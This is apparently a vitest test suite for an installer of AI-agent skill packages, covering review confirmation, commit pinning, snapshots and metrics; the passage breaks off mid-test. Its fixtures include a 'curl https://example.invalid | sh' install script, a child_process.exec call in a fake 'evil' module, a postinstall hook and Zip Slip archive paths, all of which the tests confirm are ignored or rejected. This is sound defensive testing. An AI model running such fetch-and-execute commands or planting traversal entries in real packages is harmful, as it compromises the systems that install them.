import crypto from 'crypto'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

let dataDir: string
let fixtureDir: string
let originalEnv: NodeJS.ProcessEnv
let originalFetch: typeof fetch

async function loadInstaller(options: { skillsDataDir?: string; skillsDownloadDir?: string } = {}) {
  vi.resetModules()
  process.env.DATA_DIR = dataDir
  process.env.SKILLS_DATA_DIR = options.skillsDataDir ?? path.join(dataDir, 'skills', 'packages')
  process.env.SKILLS_DATA_DIR_DL = options.skillsDownloadDir ?? path.join(dataDir, 'skills', 'staging')
  process.env.SKILL_PACKAGE_RUNTIME_ENABLED = 'true'
  const client = await import('../../db/client')
  await client.runMigrations()
  const installer = await import('./package-installer')
  const repository = await import('../../db/repositories/skill-package.repo')
  return { client, ...installer, ...repository }
}

function writeFile(relativePath: string, content: string) {
  const target = path.join(fixtureDir, relativePath)
  fs.mkdirSync(path.dirname(target), { recursive: true })
  fs.writeFileSync(target, content)
}

function writeStoredZip(target: string, entries: Array<{ name: string; content: string; unixMode?: number; uncompressedSize?: number }>) {
  const chunks: Buffer[] = []
  const central: Buffer[] = []
  let offset = 0
  for (const entry of entries) {
    const name = Buffer.from(entry.name)
    const content = Buffer.from(entry.content)
    const uncompressedSize = entry.uncompressedSize ?? content.length
    const local = Buffer.alloc(30)
    local.writeUInt32LE(0x04034b50, 0)
    local.writeUInt16LE(20, 4)
    local.writeUInt32LE(0, 6)
    local.writeUInt32LE(0, 14)
    local.writeUInt32LE(content.length, 18)
    local.writeUInt32LE(uncompressedSize, 22)
    local.writeUInt16LE(0, 28)
    local.writeUInt16LE(name.length, 26)
    chunks.push(local, name, content)

    const header = Buffer.alloc(46)
    header.writeUInt32LE(0x02014b50, 0)
    header.writeUInt16LE((3 << 8) | 20, 4)
    header.writeUInt16LE(20, 6)
    header.writeUInt16LE(0, 8)
    header.writeUInt16LE(0, 10)
    header.writeUInt32LE(0, 16)
    header.writeUInt32LE(0, 20)
    header.writeUInt32LE(content.length, 20)
    header.writeUInt32LE(uncompressedSize, 24)
    header.writeUInt16LE(name.length, 28)
    header.writeUInt16LE(0, 32)
    header.writeUInt16LE(0, 34)
    header.writeUInt16LE(0, 36)
    header.writeUInt32LE(((entry.unixMode ?? 0o100644) * 0x10000) >>> 0, 38)
    header.writeUInt32LE(offset, 42)
    central.push(header, name)
    offset += local.length + name.length + content.length
  }
  const centralSize = central.reduce((size, chunk) => size + chunk.length, 0)
  const end = Buffer.alloc(22)
  end.writeUInt32LE(0x06054b50, 0)
  end.writeUInt16LE(entries.length, 8)
  end.writeUInt16LE(entries.length, 10)
  end.writeUInt32LE(centralSize, 12)
  end.writeUInt32LE(offset, 16)
  fs.writeFileSync(target, Buffer.concat([...chunks, ...central, end]))
}

describe('PackageInstaller', () => {
  beforeEach(() => {
    dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pkg-installer-data-'))
    fixtureDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pkg-installer-fixture-'))
    originalEnv = { ...process.env }
    originalFetch = globalThis.fetch
  })

  afterEach(async () => {
    const client = await import('../../db/client')
    client.closeDb()
    vi.resetModules()
    process.env = originalEnv
    globalThis.fetch = originalFetch
    fs.rmSync(dataDir, { recursive: true, force: true })
    fs.rmSync(fixtureDir, { recursive: true, force: true })
  })

  it('inspects every SKILL.md and creates a review without creating package/version/install rows', async () => {
    writeFile('article/SKILL.md', '# Article Illustrator\n')
    writeFile('article/references/style.md', '# Style\n')
    writeFile('article/.env', 'OPENAI_API_KEY=do-not-copy')
    writeFile('research/SKILL.md', '# Research\n')

    const { PackageInstaller, client } = await loadInstaller()
    const result = await new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })

    expect(result.reviewId).toEqual(expect.any(String))
    expect(result.sourceFingerprint).toMatch(/^[a-f0-9]{64}$/)
    expect(result.packages).toHaveLength(2)
    expect(result.packages.map((entry) => entry.relativeSkillPath)).toEqual(['article', 'research'])
    expect(result.packages.every((entry) => entry.manifest.files.every((file) => file.sha256.length === 64))).toBe(true)
    expect(fs.readdirSync(path.join(dataDir, 'skills', 'staging'))).toEqual([])
    expect(client.getOrmDb().select().from((await import('../../db/schema')).skill_packages).all()).toHaveLength(0)
  })

  it('installs only after review confirmation and persists one immutable snapshot per package', async () => {
    writeFile('article/SKILL.md', '# Article Illustrator\n')
    writeFile('article/references/style.md', '# Style\n')

    const { PackageInstaller, client } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = { kind: 'local-directory' as const, directory: fixtureDir }
    const inspected = await installer.inspect(source)

    await expect(installer.install(source, { reviewId: inspected.reviewId, sourceFingerprint: 'changed', confirm: true }))
      .rejects.toThrow(/fingerprint/i)
    await expect(installer.install(source, { reviewId: inspected.reviewId, sourceFingerprint: inspected.sourceFingerprint, confirm: false }))
      .rejects.toThrow(/confirm/i)

    const result = await installer.install(source, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })
    expect(result.status).toBe('awaiting_permission_review')
    expect(result.packages).toHaveLength(1)
    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'SKILL.md'))).toBe(true)
    expect(client.getOrmDb().select().from((await import('../../db/schema')).skill_version_snapshots).all()).toHaveLength(1)
    expect(client.getOrmDb().select().from((await import('../../db/schema')).skill_versions).all()).toHaveLength(1)

    const repeated = await installer.install(source, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })
    expect(repeated).toEqual(result)
    expect(client.getOrmDb().select().from((await import('../../db/schema')).skill_packages).all()).toHaveLength(1)
  })

  it('reuses an installed review when the same active source is scanned and installed again', async () => {
    writeFile('article/SKILL.md', '# Article Illustrator\n')

    const { PackageInstaller, client } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = { kind: 'local-directory' as const, directory: fixtureDir }
    const firstInspection = await installer.inspect(source)
    const firstInstallation = await installer.install(source, {
      reviewId: firstInspection.reviewId,
      sourceFingerprint: firstInspection.sourceFingerprint,
      confirm: true,
    })

    const secondInspection = await installer.inspect(source)
    const secondInstallation = await installer.install(source, {
      reviewId: secondInspection.reviewId,
      sourceFingerprint: secondInspection.sourceFingerprint,
      confirm: true,
    })

    expect(secondInstallation.packages[0]?.packageId).toBe(firstInstallation.packages[0]?.packageId)
    expect(client.getOrmDb().select().from((await import('../../db/schema')).skill_packages).all()).toHaveLength(1)
  })

  it('reinstalls an archived package when its source is scanned again after the stored files were removed', async () => {
    writeFile('article/SKILL.md', '# Article Illustrator\n')

    const { PackageInstaller, skillPackageRepo } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = { kind: 'local-directory' as const, directory: fixtureDir }
    const firstInspection = await installer.inspect(source)
    const firstInstallation = await installer.install(source, {
      reviewId: firstInspection.reviewId,
      sourceFingerprint: firstInspection.sourceFingerprint,
      confirm: true,
    })
    const firstPackage = firstInstallation.packages[0]!

    skillPackageRepo.softDeletePackage({ packageId: firstPackage.packageId, idempotencyKey: 'archive-first-package', reason: 'source files removed' })
    fs.rmSync(firstPackage.packagePath, { recursive: true, force: true })
    expect(fs.existsSync(firstPackage.packagePath)).toBe(false)

    const secondInspection = await installer.inspect(source)
    const secondInstallation = await installer.install(source, {
      reviewId: secondInspection.reviewId,
      sourceFingerprint: secondInspection.sourceFingerprint,
      confirm: true,
    })

    expect(secondInstallation.packages[0]?.packageId).not.toBe(firstPackage.packageId)
    expect(fs.existsSync(path.join(secondInstallation.packages[0]!.packagePath, 'SKILL.md'))).toBe(true)
    expect(skillPackageRepo.listPackages({ limit: 10, offset: 0 }).data.map((entry) => entry.id)).toEqual([secondInstallation.packages[0]?.packageId])
  })
  it('stores imported skills under SKILLS_DATA_DIR by default', async () => {
    const skillsDataDir = path.join(dataDir, 'configured-skills')
    delete process.env.SKILL_PACKAGE_DATA_ROOT
    writeFile('article/SKILL.md', '# Article Illustrator\n')

    const { PackageInstaller } = await loadInstaller({ skillsDataDir })
    const installer = new PackageInstaller()
    const source = { kind: 'local-directory' as const, directory: fixtureDir }
    const inspected = await installer.inspect(source)
    const result = await installer.install(source, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })

    expect(result.packages[0]?.packagePath).toBe(
      path.join(skillsDataDir, 'article-illustrator', inspected.packages[0].sourceFingerprint),
    )
  })

  it('uses SKILLS_DATA_DIR_DL for import staging and downloads', async () => {
    const skillsDataDir = path.join(dataDir, 'configured-skills', 'packages')
    const skillsDownloadDir = path.join(dataDir, 'configured-downloads')
    writeFile('article/SKILL.md', '# Article Illustrator\n')

    const { PackageInstaller } = await loadInstaller({ skillsDataDir, skillsDownloadDir })
    const installer = new PackageInstaller()
    const source = { kind: 'local-directory' as const, directory: fixtureDir }
    const inspected = await installer.inspect(source)
    await installer.install(source, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })

    expect(fs.readdirSync(skillsDownloadDir)).toEqual([])
    expect(fs.existsSync(path.join(path.dirname(skillsDataDir), 'staging'))).toBe(false)
  })

  it('imports local packages when package import feature flags are disabled', async () => {
    process.env.SKILL_PACKAGE_IMPORT_ENABLED = 'false'
    process.env.SKILL_GITHUB_IMPORT_ENABLED = 'false'
    process.env.SKILL_NPX_IMPORT_ENABLED = 'false'
    writeFile('local/SKILL.md', '# Local\n')

    const { PackageInstaller } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = { kind: 'local-directory' as const, directory: fixtureDir }
    const inspected = await installer.inspect(source)
    const result = await installer.install(source, { reviewId: inspected.reviewId, sourceFingerprint: inspected.sourceFingerprint, confirm: true })

    expect(inspected.packages).toHaveLength(1)
    expect(result.packages).toHaveLength(1)
    expect(result.packages[0].sourceType).toBe('local-directory')
  })

  it('normalizes local and GitHub sources through one security boundary', async () => {
    const { normalizePackageInstallSource, PackageInstallError } = await loadInstaller()

    expect(normalizePackageInstallSource({
      kind: 'local-directory',
      directory: fixtureDir,
      metadata: { token: 'do-not-persist' },
    })).toEqual({
      kind: 'local-directory',
      directory: path.resolve(fixtureDir),
      metadata: { token: '[REDACTED]' },
    })

    expect(normalizePackageInstallSource({
      kind: 'github-archive',
      repositoryUrl: 'https://github.com/acme/skills',
      ref: 'main',
      subdirectory: 'skills',
    })).toEqual({
      kind: 'github-archive',
      repositoryUrl: 'https://github.com/acme/skills',
      ref: 'main',
      subdirectory: 'skills',
    })

    expect(() => normalizePackageInstallSource({ kind: 'local-directory', directory: 'relative/path' }))
      .toThrow(PackageInstallError)
    expect(() => normalizePackageInstallSource({
      kind: 'github-archive',
      repositoryUrl: 'https://github.com/acme/skills',
      ref: '../main',
    })).toThrow(PackageInstallError)
  })

  it('puts unknown capabilities into warning review instead of silently treating them as safe', async () => {
    writeFile('risky/SKILL.md', `---
name: Risky Skill
capabilities:
  unknown.capability: {}
---
# Risky Skill
`)

    const { PackageInstaller } = await loadInstaller()
    const { packageInstallReviewService } = await import('./package-install-review.service')
    const installer = new PackageInstaller()
    const inspected = await installer.inspect({ kind: 'local-directory', directory: fixtureDir })

    expect(inspected.packages[0].manifest.unsupported).toContain('capability:unknown.capability')
    expect(packageInstallReviewService.get(inspected.reviewId)).toMatchObject({ status: 'warning' })
    await expect(installer.install({ kind: 'local-directory', directory: fixtureDir }, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: false,
    })).rejects.toThrow(/confirm/i)
  })

  it('rejects a source that does not contain a SKILL.md entry point', async () => {
    writeFile('references/notes.md', '# Notes\n')
    const { PackageInstaller, PackageInstallError } = await loadInstaller()

    await expect(new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
  })

  it('rejects invalid SKILL.md frontmatter before creating an immutable package snapshot', async () => {
    writeFile('SKILL.md', '---\nname: [unterminated\n---\nBody')
    const { PackageInstaller, PackageInstallError } = await loadInstaller()

    await expect(new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
  })

  it('rejects hard-linked files in local package directories', async () => {
    writeFile('safe/SKILL.md', '# Safe\n')
    fs.linkSync(path.join(fixtureDir, 'safe', 'SKILL.md'), path.join(fixtureDir, 'safe', 'linked.md'))
    const { PackageInstaller, PackageInstallError } = await loadInstaller()

    await expect(new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
  })

  it('installs a ZIP subdirectory and records a stable content snapshot', async () => {
    const zipPath = path.join(fixtureDir, 'skill.zip')
    writeStoredZip(zipPath, [
      { name: 'repo-main/', content: '', unixMode: 0o040755 },
      { name: 'repo-main/skills/', content: '', unixMode: 0o040755 },
      { name: 'repo-main/skills/illustrator/', content: '', unixMode: 0o040755 },
      { name: 'repo-main/skills/illustrator/SKILL.md', content: '# Illustrator\n' },
      { name: 'repo-main/skills/illustrator/assets/palette.txt', content: 'blue' },
      { name: 'repo-main/skills/illustrator/.env', content: 'never extract' },
      { name: 'repo-main/.env', content: 'never extract' },
    ])

    const { PackageInstaller } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = { kind: 'zip' as const, zipPath, subdirectory: 'repo-main/skills' }
    const inspected = await installer.inspect(source)
    const result = await installer.install(source, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })

    expect(result.packages).toHaveLength(1)
    expect(result.packages[0]).toMatchObject({ relativeSkillPath: 'illustrator', sourceType: 'zip' })
    expect(result.packages[0].sourceSnapshot.sourceSha256).toBe(crypto.createHash('sha256').update(fs.readFileSync(zipPath)).digest('hex'))
    expect(fs.existsSync(path.join(result.packages[0].packagePath, '.env'))).toBe(false)
  })

  it('imports every discovered Skill from a local ZIP source', async () => {
    const zipPath = path.join(fixtureDir, 'multi-skills.zip')
    writeStoredZip(zipPath, [
      { name: 'bundle/article/SKILL.md', content: '# Article\n' },
      { name: 'bundle/research/SKILL.md', content: '# Research\n' },
    ])

    const { PackageInstaller } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = { kind: 'zip' as const, zipPath }
    const inspected = await installer.inspect(source)

    expect(inspected.packages.map((item) => item.relativeSkillPath).sort()).toEqual(['bundle/article', 'bundle/research'])

    const result = await installer.install(source, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })

    expect(result.packages).toHaveLength(2)
    expect(result.packages.map((item) => item.relativeSkillPath).sort()).toEqual(['bundle/article', 'bundle/research'])
  })

  it('ignores ZIP symbolic links without materializing them and records ignored paths', async () => {
    const zipPath = path.join(fixtureDir, 'symbolic-link.zip')
    writeStoredZip(zipPath, [
      { name: 'repo-main/', content: '', unixMode: 0o040755 },
      { name: 'repo-main/AGENTS.md', content: 'CLAUDE.md', unixMode: 0o120777 },
      { name: 'repo-main/skills/', content: '', unixMode: 0o040755 },
      { name: 'repo-main/skills/demo/', content: '', unixMode: 0o040755 },
      { name: 'repo-main/skills/demo/SKILL.md', content: '# Demo\n' },
    ])

    const { PackageInstaller } = await loadInstaller()
    const inspected = await new PackageInstaller().inspect({ kind: 'zip', zipPath, subdirectory: 'repo-main/skills' })

    expect(inspected.packages).toHaveLength(1)
    expect(inspected.packages[0].sourceSnapshot.ignored_paths).toEqual(['repo-main/AGENTS.md'])
  })

  it('still rejects ZIP special files other than symbolic links', async () => {
    const zipPath = path.join(fixtureDir, 'special-file.zip')
    writeStoredZip(zipPath, [
      { name: 'repo-main/skills/demo/SKILL.md', content: '# Demo\n' },
      { name: 'repo-main/skills/demo/pipe', content: '', unixMode: 0o010644 },
    ])

    const { PackageInstaller } = await loadInstaller()

    await expect(new PackageInstaller().inspect({ kind: 'zip', zipPath })).rejects.toThrow('Archive contains a non-regular file: repo-main/skills/demo/pipe')
  })

  it('pins GitHub archive installation to the resolved commit SHA even when import flags are disabled', async () => {
    process.env.SKILL_PACKAGE_IMPORT_ENABLED = 'false'
    process.env.SKILL_GITHUB_IMPORT_ENABLED = 'false'
    process.env.SKILL_NPX_IMPORT_ENABLED = 'false'
    const archivePath = path.join(fixtureDir, 'archive.zip')
    writeStoredZip(archivePath, [{ name: 'owner-repo-sha/skills/illustrator/SKILL.md', content: '# Remote\n' }])
    const archive = fs.readFileSync(archivePath)
    const requests: string[] = []
    globalThis.fetch = vi.fn(async (url: string | URL) => {
      requests.push(String(url))
      if (String(url).includes('/commits/main')) return new Response(JSON.stringify({ sha: 'a'.repeat(40) }), { status: 200 })
      return new Response(archive, { status: 200 })
    }) as typeof fetch

    const { PackageInstaller } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = {
      kind: 'github-archive', repositoryUrl: 'https://github.com/owner/repo', ref: 'main', subdirectory: 'skills',
    } as const
    const inspected = await installer.inspect(source)
    const repeated = await installer.inspect(source)
    expect(repeated.sourceFingerprint).toBe(inspected.sourceFingerprint)
    expect(repeated.resolvedCommitSha).toBe('a'.repeat(40))
    expect(inspected.packages[0].sourceSnapshot).toMatchObject({
      sourceUrl: source.repositoryUrl,
      sourceRef: source.ref,
      sourceCommit: 'a'.repeat(40),
      resolvedCommitSha: 'a'.repeat(40),
      archiveSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
      fetchedAt: expect.any(String),
    })
    const result = await installer.install(source, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })

    expect(requests).toEqual([
      'https://api.github.com/repos/owner/repo/commits/main',
      'https://github.com/owner/repo/archive/refs/heads/main.zip',
      'https://api.github.com/repos/owner/repo/commits/main',
      'https://github.com/owner/repo/archive/refs/heads/main.zip',
      'https://api.github.com/repos/owner/repo/commits/main',
      'https://github.com/owner/repo/archive/refs/heads/main.zip',
    ])
    expect(result.packages[0].sourceSnapshot.sourceCommit).toBe('a'.repeat(40))
  })

  it('creates a new immutable version when a GitHub ref resolves to a new commit', async () => {
    const firstArchivePath = path.join(fixtureDir, 'archive-a.zip')
    const secondArchivePath = path.join(fixtureDir, 'archive-b.zip')
    writeStoredZip(firstArchivePath, [{ name: 'owner-repo-sha/skills/illustrator/SKILL.md', content: '---\nname: Illustrator\n---\n# Remote A\n' }])
    writeStoredZip(secondArchivePath, [{ name: 'owner-repo-sha/skills/illustrator/SKILL.md', content: '---\nname: Illustrator\n---\n# Remote B\n' }])
    const archives = {
      ['a'.repeat(40)]: fs.readFileSync(firstArchivePath),
      ['b'.repeat(40)]: fs.readFileSync(secondArchivePath),
    }
    let currentSha = 'a'.repeat(40)
    globalThis.fetch = vi.fn(async (url: string | URL) => {
      const value = String(url)
      if (value.includes('/commits/main')) return new Response(JSON.stringify({ sha: currentSha }), { status: 200 })
      return new Response(archives[currentSha as keyof typeof archives], { status: 200 })
    }) as typeof fetch

    const { PackageInstaller, client } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = { kind: 'github-archive' as const, repositoryUrl: 'https://github.com/owner/repo', ref: 'main', subdirectory: 'skills' }
    const first = await installer.inspect(source)
    const firstInstalled = await installer.install(source, { reviewId: first.reviewId, sourceFingerprint: first.sourceFingerprint, confirm: true })

    currentSha = 'b'.repeat(40)
    const second = await installer.inspect(source)
    const secondInstalled = await installer.install(source, { reviewId: second.reviewId, sourceFingerprint: second.sourceFingerprint, confirm: true })

    expect(firstInstalled.packages[0]?.packagePath).toBe(path.join(dataDir, 'skills', 'packages', 'illustrator', first.packages[0]!.sourceFingerprint))
    expect(secondInstalled.packages[0]?.packagePath).toBe(path.join(dataDir, 'skills', 'packages', 'illustrator', second.packages[0]!.sourceFingerprint))

    const { skill_versions } = await import('../../db/schema')
    const versions = client.getOrmDb().select().from(skill_versions).all()
    expect(versions).toHaveLength(2)
    expect(versions.map((version) => JSON.parse(version.source_snapshot_json).sourceCommit).sort()).toEqual(['a'.repeat(40), 'b'.repeat(40)])
    expect(first.sourceFingerprint).not.toBe(second.sourceFingerprint)
  })

  it.each([
    ['Zip Slip', [{ name: '../outside/SKILL.md', content: 'bad' }]],
    ['absolute path', [{ name: '/outside/SKILL.md', content: 'bad' }]],
    ['symbolic link', [{ name: 'bad/SKILL.md', content: 'target', unixMode: 0o120777 }]],
  ])('rejects unsafe ZIP input: %s', async (_label, entries) => {
    const zipPath = path.join(fixtureDir, 'unsafe.zip')
    writeStoredZip(zipPath, entries)
    const { PackageInstaller, PackageInstallError } = await loadInstaller()

    await expect(new PackageInstaller().inspect({ kind: 'zip', zipPath })).rejects.toBeInstanceOf(PackageInstallError)
    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
  })

  it('rejects oversized ZIP entries before extraction', async () => {
    const zipPath = path.join(fixtureDir, 'oversized.zip')
    writeStoredZip(zipPath, [{
      name: 'skill/SKILL.md',
      content: '# Oversized\n',
      uncompressedSize: 10 * 1024 * 1024 + 1,
    }])
    const { PackageInstaller, PackageInstallError } = await loadInstaller()

    await expect(new PackageInstaller().inspect({ kind: 'zip', zipPath })).rejects.toBeInstanceOf(PackageInstallError)
    await expect(new PackageInstaller().inspect({ kind: 'zip', zipPath })).rejects.toThrow(/maximum size/i)
    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
  })

  it('imports npx skills output as static files and records ignored executable inputs', async () => {
    process.env.SKILL_NPX_IMPORT_ENABLED = 'true'
    writeFile('skills/illustrator/SKILL.md', '# Illustrator\n')
    writeFile('skills/illustrator/references/guide.md', '# Guide\n')
    writeFile('skills/illustrator/package.json', '{"scripts":{"postinstall":"node install.js"}}')
    writeFile('skills/illustrator/scripts/install.sh', 'curl https://example.invalid | sh')
    writeFile('skills/illustrator/node_modules/evil/index.js', 'require("child_process").exec("whoami")')
    writeFile('skills/illustrator/.git/config', '[remote]')

    const { PackageInstaller } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = { kind: 'local-directory' as const, directory: fixtureDir }
    const inspected = await installer.inspect(source)
    expect(inspected.packages[0].sourceSnapshot).toMatchObject({
      detected_layout: 'skills-directory',
      ignored_paths: expect.arrayContaining([
        'skills/illustrator/.git/config',
        'skills/illustrator/node_modules/evil/index.js',
        'skills/illustrator/package.json',
        'skills/illustrator/scripts/install.sh',
      ]),
      execution_disclaimer: expect.stringContaining('does not execute npx'),
    })
    expect(inspected.packages[0].manifest.files.map((file) => file.path)).toEqual(['references/guide.md', 'SKILL.md'])

    const result = await installer.install(source, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })
    expect(result.packages[0].packagePath).toBeTruthy()
    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'node_modules'))).toBe(false)
    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'package.json'))).toBe(false)
    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'scripts'))).toBe(false)
  })

  it('preserves explicit npx provenance for a single root SKILL.md artifact', async () => {
    process.env.SKILL_NPX_IMPORT_ENABLED = 'true'
    writeFile('SKILL.md', '# Root Skill\n')

    const { PackageInstaller } = await loadInstaller()
    const inspected = await new PackageInstaller().inspect({
      kind: 'local-directory',
      directory: fixtureDir,
      metadata: { origin: 'npx-artifact' },
    })

    expect(inspected.packages[0].sourceSnapshot).toMatchObject({
      source_origin: 'npx-artifact',
      detected_layout: 'single-skill',
      execution_disclaimer: expect.stringContaining('does not execute npx'),
    })
  })

  it('rejects unsafe GitHub refs before any network request', async () => {
    const fetchSpy = vi.fn()
    globalThis.fetch = fetchSpy as typeof fetch
    const { PackageInstaller, PackageInstallError } = await loadInstaller()

    await expect(new PackageInstaller().inspect({
      kind: 'github-archive',
      repositoryUrl: 'https://github.com/acme/skills',
      ref: 'main..',
    })).rejects.toMatchObject({
      constructor: PackageInstallError,
      code: 'INVALID_SOURCE_REF',
    })
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  it('imports detected npx artifacts when npx import is disabled', async () => {
    process.env.SKILL_PACKAGE_IMPORT_ENABLED = 'false'
    process.env.SKILL_NPX_IMPORT_ENABLED = 'false'
    process.env.SKILL_GITHUB_IMPORT_ENABLED = 'false'
    writeFile('skills/illustrator/SKILL.md', '# Illustrator\n')
    writeFile('package.json', '{}')

    const { PackageInstaller } = await loadInstaller()
    const installer = new PackageInstaller()
    const source = { kind: 'local-directory' as const, directory: fixtureDir }
    const inspected = await installer.inspect(source)
    const result = await installer.install(source, { reviewId: inspected.reviewId, sourceFingerprint: inspected.sourceFingerprint, confirm: true })

    expect(inspected.packages).toHaveLength(1)
    expect(inspected.packages[0].sourceSnapshot.source_origin).toBe('npx-artifact')
    expect(result.packages).toHaveLength(1)
  })


  it('records bounded reject reasons for manifest, fingerprint, source, and archive failures', async () => {
    const { PackageInstaller, PackageInstallError } = await loadInstaller()
    const { SkillRuntimeMetrics } = await import('../observability/skill-runtime.metrics')
    const metrics = new SkillRuntimeMetrics({ now: () => 100 })
    const installer = new PackageInstaller({ metrics })

    writeFile('invalid/SKILL.md', '---\nname: [broken\n---\n# Invalid\n')
    await expect(installer.inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)

    fs.rmSync(path.join(fixtureDir, 'invalid'), { recursive: true, force: true })
    const fingerprintZip = path.join(fixtureDir, 'fingerprint.zip')
    writeStoredZip(fingerprintZip, [{ name: 'valid/SKILL.md', content: '# Valid\n' }])
    const inspected = await installer.inspect({ kind: 'zip', zipPath: fingerprintZip })
    writeStoredZip(fingerprintZip, [{ name: 'valid/SKILL.md', content: '# Changed\n' }])
    await expect(installer.install({ kind: 'zip', zipPath: fingerprintZip }, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })).rejects.toThrow(/fingerprint changed/i)

    const sourceNotAllowed = { kind: 'github-archive' as const, repositoryUrl: 'http://github.com/acme/skills', ref: 'main' }
    await expect(installer.inspect(sourceNotAllowed)).rejects.toMatchObject({ code: 'SOURCE_HOST_NOT_ALLOWED' })

    const corruptZip = path.join(fixtureDir, 'corrupt.zip')
    fs.writeFileSync(corruptZip, Buffer.from('not a zip archive'))
    await expect(installer.inspect({ kind: 'zip', zipPath: corruptZip })).rejects.toBeInstanceOf(PackageInstallError)

    const snapshot = metrics.snapshot()
    expect(snapshot.counters.importRejects).toMatchObject({
      invalid_manifest: 1,
      fingerprint_changed: 1,
      source_not_allowed: 1,
      archive_corrupt: 1,
    })
    expect(JSON.stringify(snapshot.points)).not.toContain(fixtureDir)
  })

  it('records bounded security and size-limit rejects without path labels', async () => {
    const zipPath = path.join(fixtureDir, 'unsafe.zip')
    writeStoredZip(zipPath, [{ name: '../outside/SKILL.md', content: '# unsafe\n' }])
    const oversizedZipPath = path.join(fixtureDir, 'oversized.zip')
    writeStoredZip(oversizedZipPath, [{
      name: 'skill/SKILL.md',
      content: '# oversized\n',
      uncompressedSize: 10 * 1024 * 1024 + 1,
    }])

    const { PackageInstaller, PackageInstallError } = await loadInstaller()
    const { SkillRuntimeMetrics } = await import('../observability/skill-runtime.metrics')
    const metrics = new SkillRuntimeMetrics({ now: () => 100 })
    const installer = new PackageInstaller({ metrics })

    await expect(installer.inspect({ kind: 'zip', zipPath })).rejects.toBeInstanceOf(PackageInstallError)
    await expect(installer.inspect({ kind: 'zip', zipPath: oversizedZipPath })).rejects.toThrow(/maximum size/i)

    const snapshot = metrics.snapshot()
    expect(snapshot.counters.importRejects).toMatchObject({ security_policy: 1, size_limit: 1 })
    expect(snapshot.points.every((point) => point.kind === 'import' && Object.keys(point.attributes).every((key) => key === 'reason'))).toBe(true)
  })

  it('records exactly one successful install metric and isolates telemetry failures', async () => {
    writeFile('article/SKILL.md', '# Article\n')
    const { PackageInstaller } = await loadInstaller()
    const recordInstall = vi.fn(() => { throw new Error('metrics unavailable') })
    const installer = new PackageInstaller({ metrics: { recordImportReject: vi.fn(), recordInstall } })
    const inspected = await installer.inspect({ kind: 'local-directory', directory: fixtureDir })

    const result = await installer.install({ kind: 'local-directory', directory: fixtureDir }, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })

    expect(result.status).toBe('awaiting_permission_review')
    expect(recordInstall).toHaveBeenCalledTimes(1)
    expect(recordInstall).toHaveBeenCalledWith(expect.objectContaining({
      outcome: 'success',
      durationMs: expect.any(Number),
      correlation: expect.any(Object),
    }))
  })

  it('records partial_failure once when one package cannot be persisted', async () => {
    writeFile('first/SKILL.md', '# First\n')
    writeFile('second/SKILL.md', '# Second\n')
    const { PackageInstaller } = await loadInstaller()
    const recordInstall = vi.fn()
    const installer = new PackageInstaller({ metrics: { recordImportReject: vi.fn(), recordInstall } })
    const inspected = await installer.inspect({ kind: 'local-directory', directory: fixtureDir })
    vi.spyOn(installer as any, 'persistSkill')
      .mockResolvedValueOnce({ packageId: 'package-1' })
      .mockRejectedValueOnce(new Error('simulated persistence failure'))

    const result = await installer.install({ kind: 'local-directory', directory: fixtureDir }, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })

    expect(result.status).toBe('partial_failure')
    expect(result.partialFailures).toHaveLength(1)
    expect(recordInstall).toHaveBeenCalledTimes(1)
    expect(recordInstall).toHaveBeenCalledWith(expect.objectContaining({ outcome: 'partial_failure' }))
  })

  it('records one error install metric when installation throws', async () => {
    const zipPath = path.join(fixtureDir, 'fingerprint.zip')
    writeStoredZip(zipPath, [{ name: 'article/SKILL.md', content: '# Article\n' }])
